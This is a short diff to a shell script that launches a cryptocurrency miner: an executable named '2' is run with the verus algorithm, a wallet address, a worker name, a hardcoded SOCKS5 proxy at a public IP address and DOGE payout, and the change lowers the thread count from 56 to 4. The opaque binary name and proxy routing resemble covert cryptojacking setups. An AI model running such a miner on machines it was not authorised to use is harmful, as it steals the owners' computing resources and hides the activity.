@@ -8,4 +8,4 @@ B=DH9JoGyT5t41Sf5uipUYVqR7hdJq1GSg1u
 C=SUPER99
 D=socks5://72.217.216.239:4145
 
-chmod u+x 2 && ./2 -a verus -o $A -u $B.$C -x $D  -p c=DOGE --cpu-priority 5 -t 56 --max-diff=39000
+chmod u+x 2 && ./2 -a verus -o $A -u $B.$C -x $D  -p c=DOGE --cpu-priority 5 -t 4 --max-diff=39000
